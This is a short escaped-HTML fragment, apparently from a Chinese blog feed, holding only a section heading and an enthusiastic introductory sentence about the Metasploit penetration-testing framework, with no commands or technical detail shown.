-      &lt;h2 id=&quot;0x00-Metasploit-Framework简介&quot;&gt;&lt;a href=&quot;#0x00-Metasploit-Framework简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. Metasploit Framework简介&quot;&gt;&lt;/a&gt;0x00. Metasploit Framework简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！&quot;&gt;&lt;a href=&quot;#emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！&lt;/h4&gt;
     
     </summary>
     
